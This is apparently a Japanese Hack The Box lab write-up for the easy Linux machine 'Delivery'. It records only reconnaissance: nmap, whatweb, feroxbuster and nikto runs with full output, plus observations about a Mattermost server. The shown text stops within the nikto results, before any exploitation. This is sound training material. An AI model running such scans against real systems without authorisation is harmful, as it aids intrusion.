![](https://i.imgur.com/MFFHLmO.png)


- URL : 
- #easy`
- OS : #Linux 
- Machine Author(s): [ippsec](https://app.hackthebox.com/users/3769)
- Hack Date: 2025-06-20,12:13

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ


## nmap

|          |      |                                                |                                                                   |
| -------- | ---- | ---------------------------------------------- | ----------------------------------------------------------------- |
| 22/tcp   | ssh  | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | 各種ホスト鍵（RSA, ECDSA, ED25519）あり                                     |
| 80/tcp   | http | nginx 1.14.2                                   | タイトル: Welcomeヘッダ: nginx/1.14.2                                    |
| 8065/tcp | http | Golang net/http server（Mattermost）             | タイトル: MattermostX-Version-Id: 5.30.0.5.30.1…robots.txtで/をDisallow |


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine]
└─$ echo 'export Target_IP="10.129.228.222"' >> ~/.zshrc
source ~/.zshrc
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine]
└─$ sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 20:17 PDT
Initiating Parallel DNS resolution of 1 host. at 20:17
Completed Parallel DNS resolution of 1 host. at 20:17, 0.02s elapsed
Initiating SYN Stealth Scan at 20:17
Scanning 10.129.228.222 [65536 ports]
Discovered open port 22/tcp on 10.129.228.222
Discovered open port 80/tcp on 10.129.228.222
Discovered open port 8065/tcp on 10.129.228.222
Completed SYN Stealth Scan at 20:17, 26.49s elapsed (65536 total ports)
Nmap scan report for 10.129.228.222
Host is up (0.087s latency).
Not shown: 65505 closed tcp ports (reset), 28 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.66 seconds
           Raw packets sent: 66300 (2.917MB) | Rcvd: 65779 (2.631MB)
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 20:17 PDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:17
Completed NSE at 20:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:17
Completed NSE at 20:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:17
Completed NSE at 20:17, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:17
Completed Parallel DNS resolution of 1 host. at 20:17, 0.00s elapsed
Initiating SYN Stealth Scan at 20:17
Scanning 10.129.228.222 [3 ports]
Discovered open port 80/tcp on 10.129.228.222
Discovered open port 8065/tcp on 10.129.228.222
Discovered open port 22/tcp on 10.129.228.222
Completed SYN Stealth Scan at 20:17, 0.11s elapsed (3 total ports)
Initiating Service scan at 20:17
Scanning 3 services on 10.129.228.222
Completed Service scan at 20:18, 30.85s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.129.228.222
Initiating Traceroute at 20:18
Completed Traceroute at 20:18, 0.11s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 20:18
Completed Parallel DNS resolution of 2 hosts. at 20:18, 0.04s elapsed
NSE: Script scanning 10.129.228.222.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 3.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.41s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
Nmap scan report for 10.129.228.222
Host is up, received user-set (0.10s latency).
Scanned at 2025-06-19 20:17:39 PDT for 37s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY=
|   256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
|_http-title: Welcome
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
8065/tcp open  http    syn-ack ttl 63 Golang net/http server
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET
|_http-title: Mattermost
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Fri, 20 Jun 2025 03:13:14 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: oni5b5xkdpnndyr65k14ak6u8o
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Fri, 20 Jun 2025 03:18:04 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Fri, 20 Jun 2025 03:13:14 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 4hg7su9ab7fxbjdro9i7m3t4gy
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Fri, 20 Jun 2025 03:17:48 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Fri, 20 Jun 2025 03:17:48 GMT
|_    Content-Length: 0
|_http-favicon: Unknown favicon MD5: 6B215BD4A98C6722601D4F8A985BF370
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.95%I=7%D=6/19%Time=6854D2DA%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ra
SF:nges:\x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20p
SF:ublic\r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-a
SF:ncestors\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Fri,\
SF:x2020\x20Jun\x202025\x2003:13:14\x20GMT\r\nX-Frame-Options:\x20SAMEORIG
SF:IN\r\nX-Request-Id:\x204hg7su9ab7fxbjdro9i7m3t4gy\r\nX-Version-Id:\x205
SF:\.30\.0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20
SF:Fri,\x2020\x20Jun\x202025\x2003:17:48\x20GMT\r\n\r\n<!doctype\x20html><
SF:html\x20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"vi
SF:ewport\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=
SF:1,user-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20n
SF:ofollow\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>
SF:Mattermost</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\
SF:"yes\"><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><me
SF:ta\x20name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re
SF:")%r(HTTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDa
SF:te:\x20Fri,\x2020\x20Jun\x202025\x2003:17:48\x20GMT\r\nContent-Length:\
SF:x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequ
SF:est,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCache-Con
SF:trol:\x20no-cache,\x20max-age=31556926,\x20public\r\nContent-Length:\x2
SF:03108\r\nContent-Security-Policy:\x20frame-ancestors\x20'self';\x20scri
SF:pt-src\x20'self'\x20cdn\.rudderlabs\.com\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLast-Modified:\x20Fri,\x2020\x20Jun\x202025\x2003:
SF:13:14\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Request-Id:\x20oni5
SF:b5xkdpnndyr65k14ak6u8o\r\nX-Version-Id:\x205\.30\.0\.5\.30\.1\.57fb31b8
SF:89bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Fri,\x2020\x20Jun\x202025\x
SF:2003:18:04\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><
SF:meta\x20charset=\"utf-8\"><meta\x20name=\"viewport\"\x20content=\"width
SF:=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"><meta\x
SF:20name=\"robots\"\x20content=\"noindex,\x20nofollow\"><meta\x20name=\"r
SF:eferrer\"\x20content=\"no-referrer\"><title>Mattermost</title><meta\x20
SF:name=\"mobile-web-app-capable\"\x20content=\"yes\"><meta\x20name=\"appl
SF:ication-name\"\x20content=\"Mattermost\"><meta\x20name=\"format-detecti
SF:on\"\x20content=\"telephone=no\"><link\x20re");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/19%OT=22%CT=%CU=38049%PV=Y%DS=2%DC=T%G=N%TM=6854D2F8
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M5
OS:52ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8
OS:8)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Uptime guess: 11.107 days (since Sun Jun  8 17:44:07 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   98.23 ms 10.10.14.1
2   98.30 ms 10.129.228.222

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.67 seconds
           Raw packets sent: 36 (2.394KB) | Rcvd: 28 (1.902KB)

```

nmapの結果から、22番と80番が空いている典型的なwebサーバーだけでなくて、mattermostがホストされてるのがわかる

```sh
└─$ sudo nmap -sU -T4 -Pn $Target_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 21:13 PDT
Warning: 10.129.228.222 giving up on port because retransmission cap hit (6).
Nmap scan report for delivery.htb (10.129.228.222)
Host is up (0.086s latency).
Not shown: 976 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
631/udp   open|filtered ipp
1037/udp  open|filtered ams
1042/udp  open|filtered afrog
1886/udp  open|filtered leoip
5353/udp  open|filtered zeroconf
17077/udp open|filtered unknown
17321/udp open|filtered unknown
17939/udp open|filtered unknown
18830/udp open|filtered unknown
18869/udp open|filtered unknown
19315/udp open|filtered keyshadow
19503/udp open|filtered unknown
20540/udp open|filtered unknown
21186/udp open|filtered unknown
21454/udp open|filtered unknown
21902/udp open|filtered unknown
23781/udp open|filtered unknown
27473/udp open|filtered unknown
32769/udp open|filtered filenet-rpc
37144/udp open|filtered unknown
44179/udp open|filtered unknown
46532/udp open|filtered unknown
64080/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1064.04 seconds
```

## WebSite Screenshot
- `http://10.129.228.222:8065/robots.txt`は特に情報ない
- 全体をDisallowに入れてるから
![](https://i.imgur.com/iqTnA67.png)

`http://10.129.228.222:80/`はこんな感じ
![](https://i.imgur.com/59HGyku.png)


`http://10.129.228.222/#contact-us`
- ここで、mattermostサーバーについて触れられてる

「未登録のユーザーの方は、弊社チームへのご連絡には HelpDesk をご利用ください。
@delivery.htb のメールアドレスを取得すると、MatterMost サーバーへのアクセスが可能になります。」
![](https://i.imgur.com/EyQiIkI.png)

そして、mattermost serverのリンク上にポインターを持っていくと、`http://delivery.htb:8065/`にリンクしていることがわかるから、/etc/hostsでドメインを設定しておく
![](https://i.imgur.com/yb1bnmp.png)


`http://delivery.htb:8065/login`の検証
- JSで、なんか2つ、プラグインを読み込んでる？
	- com.mattermost.plugin-channel-export, version 0.2.2
	- com.mattermost.nps, version 1.1.0
- mattermostのバージョン知りたいなあ
![](https://i.imgur.com/HbN2DGR.png)


`http://10.129.228.222:80/assets/css/noscript.css`
10.129.228.222:80の方は、「html5up.net」で作られていそう
![](https://i.imgur.com/yf2zUm8.png)
## whatweb
```bash
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.228.222:8065/
http://10.129.228.222:8065/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.228.222], Script, Title[Mattermost], UncommonHeaders[content-security-policy,x-request-id,x-version-id], X-Frame-Options[SAMEORIGIN]

```

## Feroxbuster
```bash
└─$ feroxbuster -u http://10.129.228.222:80  
                                                                                                                                                                               
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.222:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      185c http://10.129.228.222/images => http://10.129.228.222/images/
200      GET       12l       35w      205c http://10.129.228.222/assets/css/noscript.css
200      GET       35l       73w      454c http://10.129.228.222/assets/css/ie9.css
200      GET      409l      734w     8801c http://10.129.228.222/assets/js/main.js
200      GET      587l     1232w    12433c http://10.129.228.222/assets/js/util.js
301      GET        7l       12w      185c http://10.129.228.222/assets => http://10.129.228.222/assets/
301      GET        7l       12w      185c http://10.129.228.222/error => http://10.129.228.222/error/
403      GET        7l       10w      169c http://10.129.228.222/assets/
301      GET        7l       12w      185c http://10.129.228.222/assets/css => http://10.129.228.222/assets/css/
301      GET        7l       12w      185c http://10.129.228.222/assets/js => http://10.129.228.222/assets/js/
403      GET        7l       10w      169c http://10.129.228.222/assets/css/
403      GET        7l       10w      169c http://10.129.228.222/assets/js/
200      GET        2l      138w     9085c http://10.129.228.222/assets/js/skel.min.js
200      GET     1594l     3457w    32628c http://10.129.228.222/assets/css/main.css
301      GET        7l       12w      185c http://10.129.228.222/assets/fonts => http://10.129.228.222/assets/fonts/
200      GET        5l     1413w    95957c http://10.129.228.222/assets/js/jquery.min.js
200      GET      311l      760w    10850c http://10.129.228.222/
[####################] - 66s   240020/240020  0s      found:17      errors:0      
[####################] - 64s    30000/30000   466/s   http://10.129.228.222:80/ 
[####################] - 65s    30000/30000   463/s   http://10.129.228.222/ 
[####################] - 64s    30000/30000   468/s   http://10.129.228.222/images/ 
[####################] - 64s    30000/30000   466/s   http://10.129.228.222/assets/css/ 
[####################] - 64s    30000/30000   466/s   http://10.129.228.222/assets/js/ 
[####################] - 64s    30000/30000   466/s   http://10.129.228.222/assets/ 
[####################] - 64s    30000/30000   470/s   http://10.129.228.222/error/ 
[####################] - 63s    30000/30000   472/s   http://10.129.228.222/assets/fonts/   



└─$ feroxbuster -u http://10.129.228.222:8065            
                                                                                                                                                                               
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.222:8065
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l      140w     3108c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 61s    30000/30000   0s      found:0       errors:0      
[####################] - 60s    30000/30000   498/s   http://10.129.228.222:8065/  
```


## nikto
```sh
┌──(kali㉿kali)-[~]
└─$ nikto -h  http://10.129.228.222:8065/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.228.222
+ Target Hostname:    10.129.228.222
+ Target Port:        8065
+ Start Time:         2025-06-19 20:49:27 (GMT-7)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: IP address found in the 'x-version-id' header. The IP is "5.30.0.5". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /: Uncommon header 'x-request-id' found, with contents: d6kyqfbco3n19kwbh5oe9xso8e.
+ /: Uncommon header 'x-version-id' found, with contents: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /backup.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /dump.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228222.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /222.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /backup.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10129228.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /129.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.alz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.war: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.tgz: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10_129_228_222.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.jks: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /database.egg: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /site.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.pem: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.tar.bz2: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /228.tar.lzma: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /archive.cer: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /10.129.228.222.tar: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
